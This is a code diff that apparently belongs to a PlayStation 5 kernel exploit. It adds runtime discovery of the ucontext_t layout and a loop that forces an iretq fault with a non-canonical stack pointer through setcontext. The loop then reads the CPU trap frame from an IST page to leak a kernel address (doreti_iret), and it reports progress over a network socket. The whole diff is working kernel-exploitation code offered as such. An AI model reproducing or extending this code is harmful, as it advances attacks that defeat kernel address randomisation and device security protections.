@@ -84,6 +84,12 @@ static volatile uint64_t     gp_trap_mc_err;
 static sigjmp_buf            gp_trap_jmp_env;
 static volatile sig_atomic_t gp_trap_attempt_count;
 static volatile int          gp_trap_sig_received;
+/* Runtime-discovered byte offsets into ucontext_t for mc_rip/mc_rsp.
+ * PS5's ucontext_t layout may differ from the SDK headers (e.g.,
+ * larger sigset_t shifts uc_mcontext).  We probe getcontext() to
+ * find the real offsets. */
+static int gp_trap_uc_rip_off = -1;
+static int gp_trap_uc_rsp_off = -1;
 
 /* Server configuration */
 #define SERVER_PORT 9023
@@ -2861,10 +2867,19 @@ static void
 gp_trap_fault_handler(int sig, siginfo_t *info, void *ctx)
 {
     (void)info;
-    ucontext_t *uc = (ucontext_t *)ctx;
-    gp_trap_doreti_addr = uc->uc_mcontext.mc_rip;
-    gp_trap_mc_cs       = uc->uc_mcontext.mc_cs;
-    gp_trap_mc_err      = uc->uc_mcontext.mc_err;
+    if (gp_trap_uc_rip_off >= 0) {
+        /* Use runtime-discovered offsets (PS5 layout differs from SDK) */
+        uint8_t *p = (uint8_t *)ctx;
+        gp_trap_doreti_addr = *(uint64_t *)(p + gp_trap_uc_rip_off);
+        gp_trap_mc_cs  = *(uint64_t *)(p + gp_trap_uc_rip_off + 8);
+        gp_trap_mc_err = *(uint64_t *)(p + gp_trap_uc_rip_off - 8);
+    } else {
+        /* Fallback: use SDK struct layout */
+        ucontext_t *uc = (ucontext_t *)ctx;
+        gp_trap_doreti_addr = uc->uc_mcontext.mc_rip;
+        gp_trap_mc_cs       = uc->uc_mcontext.mc_cs;
+        gp_trap_mc_err      = uc->uc_mcontext.mc_err;
+    }
     gp_trap_sig_received = sig;
     gp_trap_got_result  = 1;
     siglongjmp(gp_trap_jmp_env, 1);
@@ -4598,42 +4613,150 @@ broad_done:
             goto step7_cleanup;
         }
 
-        /* 7i. Trigger loop
+        /* 7i. Probe ucontext_t layout + trigger iretq fault
          *
-         * Two strategies to fault at doreti_iret:
-         * A) Non-canonical RSP → #SS(0) on AMD, #GP(0) on some CPUs
-         * B) Non-canonical RIP → #GP(0)
-         *
-         * The CPU pushes a trap frame onto our IST page via DMAP.
-         * We read doreti_iret from page+0xFD8 (the RIP field).
-         * The writer thread also races CS for signal delivery.
-         *
-         * Diagnostics: log every step to pinpoint failures.
+         * PS5's ucontext_t layout differs from the SDK headers.  The
+         * uc_sigmask (sigset_t) is larger on PS5, which shifts the
+         * uc_mcontext to a higher byte offset.  When we access
+         * uc.uc_mcontext.mc_rip using SDK offsets, we actually read
+         * mc_onstack (=1) instead of the real RIP.  We must discover
+         * the real byte offsets at runtime by probing getcontext().
          */
-        send_response(sock, "\n7i. Triggering iretq fault...\n");
+        send_response(sock, "\n7i. Probing ucontext_t layout + trigger...\n");
 
-        /* 7i-pre: Self-test signal handler with deliberate SIGSEGV */
-        send_response(sock, "  [test] signal self-test: deliberate SIGSEGV...\n");
+        /* Phase 1: Discover real mc_rip/mc_rsp offsets in ucontext_t */
         {
-            gp_trap_got_result = 0;
-            gp_trap_sig_received = 0;
-            gp_trap_attempt_count = 0;
-            if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
-                send_response(sock, "  [test] signal %d caught! handler works. "
-                              "mc_rip=0x%lx\n",
-                              (int)gp_trap_sig_received,
-                              (uint64_t)gp_trap_doreti_addr);
+            /*
+             * Use an oversized buffer — PS5's real ucontext_t may be
+             * much larger than the SDK struct (e.g., ~176-byte sigset
+             * instead of 16 bytes, shifting mcontext by ~160 bytes).
+             */
+            uint8_t uc_buf[2048] __attribute__((aligned(16)));
+
+            /* Capture current RSP right before getcontext */
+            uint64_t known_rsp;
+            __asm__ volatile ("mov %%rsp, %0" : "=r"(known_rsp));
+
+            /* Fill with sentinel so we can distinguish real values */
+            memset(uc_buf, 0xAA, sizeof(uc_buf));
+
+            getcontext((ucontext_t *)uc_buf);
+
+            /* Get approximate code address for annotation */
+            uint64_t approx_rip = (uint64_t)gp_trap_fault_handler;
+
+            send_response(sock,
+                "  probe: known_rsp=0x%lx approx_code=0x%lx\n",
+                known_rsp, approx_rip);
+            send_response(sock,
+                "  SDK layout: mc_rip@%zu mc_rsp@%zu sizeof=%zu\n",
+                __builtin_offsetof(ucontext_t, uc_mcontext.mc_rip),
+                __builtin_offsetof(ucontext_t, uc_mcontext.mc_rsp),
+                sizeof(ucontext_t));
+
+            /* Dump non-sentinel qwords for analysis */
+            send_response(sock, "  raw ucontext (non-0xAA qwords):\n");
+            for (int i = 0; i < 800 && i < (int)sizeof(uc_buf); i += 8) {
+                uint64_t val = *(uint64_t *)(uc_buf + i);
+                if (val == 0xAAAAAAAAAAAAAAAAULL)
+                    continue;
+                send_response(sock, "    [%3d] 0x%016lx", i, val);
+                if (val >= known_rsp - 0x400 &&
+                    val <= known_rsp + 0x400)
+                    send_response(sock, "  <-- RSP?");
+                if (val >= approx_rip - 0x400000 &&
+                    val <= approx_rip + 0x400000 &&
+                    val > 0x10000)
+                    send_response(sock, "  <-- code?");
+                if (val == 0x43)
+                    send_response(sock, "  <-- CS=0x43?");
+                send_response(sock, "\n");
+            }
+
+            /*
+             * Search for mc_rsp: an 8-byte value matching known_rsp
+             * (±0x400) with CS=0x43 at offset-16 (mc_cs is 2 fields
+             * before mc_rsp: mc_rip, mc_cs, mc_rflags, mc_rsp).
+             */
+            int found_rsp_off = -1, found_rip_off = -1;
+            for (int off = 24; off < 1024; off += 8) {
+                uint64_t val = *(uint64_t *)(uc_buf + off);
+                if (val == 0xAAAAAAAAAAAAAAAAULL || val == 0)
+                    continue;
+                if (val < known_rsp - 0x400 || val > known_rsp + 0x400)
+                    continue;
+                /* Verify: mc_cs at off-16 should be 0x43 (user CS) */
+                uint64_t maybe_cs = *(uint64_t *)(uc_buf + off - 16);
+                if (maybe_cs == 0x43) {
+                    found_rsp_off = off;
+                    found_rip_off = off - 24; /* mc_rip is 3 qwords before mc_rsp */
+                    break;
+                }
+            }
+
+            if (found_rsp_off < 0) {
+                /* Relaxed search: find RSP without CS verification */
+                for (int off = 0; off < 1024; off += 8) {
+                    uint64_t val = *(uint64_t *)(uc_buf + off);
+                    if (val != 0xAAAAAAAAAAAAAAAAULL && val != 0 &&
+                        val >= known_rsp - 0x400 &&
+                        val <= known_rsp + 0x400) {
+                        send_response(sock,
+                            "  candidate RSP at [%d]: 0x%lx "
+                            "(cs@[%d]=0x%lx)\n",
+                            off, val, off - 16,
+                            off >= 16 ?
+                                *(uint64_t *)(uc_buf + off - 16) : 0UL);
+                        if (found_rsp_off < 0) {
+                            found_rsp_off = off;
+                            found_rip_off = off - 24;
+                        }
+                    }
+                }
+            }
+
+            if (found_rip_off >= 0 && found_rsp_off >= 0) {
+                uint64_t rip_val = *(uint64_t *)(uc_buf + found_rip_off);
+                uint64_t rsp_val = *(uint64_t *)(uc_buf + found_rsp_off);
+                send_response(sock,
+                    "  FOUND mc_rip at ucontext+%d (val=0x%lx)\n",
+                    found_rip_off, rip_val);
+                send_response(sock,
+                    "  FOUND mc_rsp at ucontext+%d (val=0x%lx)\n",
+                    found_rsp_off, rsp_val);
+                int shift = found_rsp_off -
+                    (int)__builtin_offsetof(ucontext_t, uc_mcontext.mc_rsp);
+                send_response(sock,
+                    "  layout shift: %+d bytes (sigset likely %d bytes)\n",
+                    shift,
+                    (int)__builtin_offsetof(ucontext_t, uc_mcontext) + shift);
+                gp_trap_uc_rip_off = found_rip_off;
+                gp_trap_uc_rsp_off = found_rsp_off;
             } else {
-                send_response(sock, "  [test] reading address 0...\n");
-                volatile int *bad = (volatile int *)0;
-                int x = *bad;
-                (void)x;
-                send_response(sock, "  [test] no fault?! read returned\n");
+                send_response(sock,
+                    "  WARNING: auto-detect failed, using SDK offsets\n");
             }
         }
 
-        /* 7i-main: actual trigger loop */
-        send_response(sock, "  [trig] starting trigger loop (50 attempts)...\n");
+        /* Phase 2: Self-test signal delivery */
+        send_response(sock, "\n  Signal self-test...\n");
+        {
+            gp_trap_got_result = 0;
+            gp_trap_sig_received = 0;
+            if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
+                send_response(sock,
+                    "  signal %d caught, handler OK\n",
+                    (int)gp_trap_sig_received);
+            } else {
+                volatile int *bad = (volatile int *)0;
+                int x = *bad;
+                (void)x;
+                send_response(sock, "  FAIL: no fault on null read\n");
+            }
+        }
+
+        /* Phase 3: Trigger loop */
+        send_response(sock, "\n  Starting trigger loop (50 attempts)...\n");
         {
             int max_attempts = 50;
             gp_trap_attempt_count = 0;
@@ -4642,108 +4765,101 @@ broad_done:
             gp_trap_doreti_addr = 0;
             volatile uint8_t *istp = (volatile uint8_t *)ist_page;
 
-            /* Clear IST trap frame area (0xFD0..0xFFF) */
+            /* Clear IST trap frame area */
             for (int i = 0xFD0; i < 0x1000; i++)
                 istp[i] = 0;
 
-            send_response(sock, "  [trig] IST cleared, entering sigsetjmp\n");
-
             if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
-                /* Returned from signal handler via siglongjmp */
-                send_response(sock, "  [trig] signal %d (%s) caught! "
-                              "mc_rip=0x%lx mc_cs=0x%lx mc_err=0x%lx\n",
-                              (int)gp_trap_sig_received,
-                              gp_trap_sig_received == SIGBUS ? "SIGBUS" :
-                              gp_trap_sig_received == SIGSEGV ? "SIGSEGV" : "?",
-                              (uint64_t)gp_trap_doreti_addr,
-                              (uint64_t)gp_trap_mc_cs,
-                              (uint64_t)gp_trap_mc_err);
+                /* Signal handler caught something */
+                send_response(sock,
+                    "  signal %d caught! doreti=0x%lx cs=0x%lx "
+                    "err=0x%lx\n",
+                    (int)gp_trap_sig_received,
+                    (uint64_t)gp_trap_doreti_addr,
+                    (uint64_t)gp_trap_mc_cs,
+                    (uint64_t)gp_trap_mc_err);
             } else {
-                send_response(sock, "  [trig] sigsetjmp=0, entering while loop\n");
-
                 while (!gp_trap_got_result &&
                        gp_trap_attempt_count < max_attempts) {
+                    /*
+                     * Oversized buffer for getcontext/setcontext so
+                     * the real PS5-sized ucontext fits.
+                     */
+                    uint8_t uc_buf[2048] __attribute__((aligned(16)));
+                    memset(uc_buf, 0, sizeof(uc_buf));
 
-                    send_response(sock, "  [trig] loop top count=%d\n",
-                                  (int)gp_trap_attempt_count);
-
-                    ucontext_t uc;
-                    int gc_rc = getcontext(&uc);
-
+                    getcontext((ucontext_t *)uc_buf);
                     gp_trap_attempt_count++;
-
-                    send_response(sock, "  [trig] getcontext=%d count=%d "
-                                  "mc_rip=0x%lx mc_rsp=0x%lx\n",
-                                  gc_rc, (int)gp_trap_attempt_count,
-                                  (uint64_t)uc.uc_mcontext.mc_rip,
-                                  (uint64_t)uc.uc_mcontext.mc_rsp);
 
                     if (gp_trap_got_result)
                         break;
-
-                    /* Enforce limit — setcontext bypasses while-cond */
                     if (gp_trap_attempt_count > max_attempts)
                         break;
 
-                    /* Check IST page for doreti_iret from a fault */
+                    /* Check IST page for CPU trap frame */
                     {
                         uint64_t rip_val = *(volatile uint64_t *)(istp + 0xFD8);
                         uint64_t cs_val  = *(volatile uint64_t *)(istp + 0xFE0);
                         uint64_t err_val = *(volatile uint64_t *)(istp + 0xFD0);
-                        uint64_t fl_val  = *(volatile uint64_t *)(istp + 0xFE8);
-                        uint64_t rsp_val = *(volatile uint64_t *)(istp + 0xFF0);
-                        uint64_t ss_val  = *(volatile uint64_t *)(istp + 0xFF8);
 
-                        if (gp_trap_attempt_count <= 5) {
+                        if (gp_trap_attempt_count <= 3) {
                             send_response(sock,
-                                "  IST@%d: err=%lx RIP=%lx CS=%lx "
-                                "FL=%lx RSP=%lx SS=%lx\n",
+                                "  IST@%d: err=0x%lx RIP=0x%lx "
+                                "CS=0x%lx\n",
                                 (int)gp_trap_attempt_count,
-                                err_val, rip_val, cs_val,
-                                fl_val, rsp_val, ss_val);
+                                err_val, rip_val, cs_val);
                         }
 
                         if (rip_val >= 0xFFFF800000000000ULL &&
                             rip_val != 0xFFFFFFFFFFFFFFFFULL) {
                             gp_trap_doreti_addr = rip_val;
-                            gp_trap_mc_cs  = cs_val;
+                            gp_trap_mc_cs = cs_val;
                             gp_trap_mc_err = err_val;
                             gp_trap_got_result = 1;
                             gp_trap_sig_received = -1;
                             send_response(sock,
-                                "  IST page read: RIP=0x%lx CS=0x%lx "
+                                "  IST hit! RIP=0x%lx CS=0x%lx "
                                 "err=0x%lx\n",
                                 rip_val, cs_val, err_val);
                             break;
                         }
                     }
 
-                    const char *strategy;
-                    if (gp_trap_attempt_count <= 25) {
-                        uc.uc_mcontext.mc_rsp = 0x8000000000000000ULL;
-                        strategy = "non-canonical RSP";
+                    /* Set non-canonical RSP to fault on iretq */
+                    if (gp_trap_uc_rsp_off >= 0) {
+                        *(uint64_t *)(uc_buf + gp_trap_uc_rsp_off) =
+                            0x8000000000000000ULL;
                     } else {
-                        uc.uc_mcontext.mc_rip = 0x8000000000000000ULL;
-                        strategy = "non-canonical RIP";
+                        ucontext_t *uc = (ucontext_t *)uc_buf;
+                        uc->uc_mcontext.mc_rsp = 0x8000000000000000ULL;
                     }
 
-                    send_response(sock, "  [trig] attempt %d (%s) "
-                                  "calling setcontext...\n",
-                                  (int)gp_trap_attempt_count, strategy);
+                    if (gp_trap_attempt_count <= 5 ||
+                        gp_trap_attempt_count % 10 == 0) {
+                        send_response(sock, "  attempt %d, setcontext...\n",
+                                      (int)gp_trap_attempt_count);
+                    }
 
-                    setcontext(&uc);
+                    setcontext((ucontext_t *)uc_buf);
 
-                    /* setcontext returned — kernel rejected */
-                    send_response(sock, "  [trig] setcontext RETURNED "
-                                  "errno=%d at attempt %d\n",
-                                  errno, (int)gp_trap_attempt_count);
+                    /* setcontext returned — failed */
+                    send_response(sock,
+                        "  setcontext returned! errno=%d\n", errno);
                     usleep(1000);
                 }
 
-                send_response(sock, "  [trig] loop exited: count=%d "
-                              "got_result=%d\n",
+                send_response(sock, "  loop done: count=%d got=%d\n",
                               (int)gp_trap_attempt_count,
                               (int)gp_trap_got_result);
+            }
+
+            /* Final IST dump if no result */
+            if (!gp_trap_got_result) {
+                send_response(sock, "  Final IST: ");
+                for (int i = 0xFD0; i < 0x1000; i += 8)
+                    send_response(sock, "%lx ",
+                        *(volatile uint64_t *)(istp + i));
+                send_response(sock, "\n");
             }
         }
 
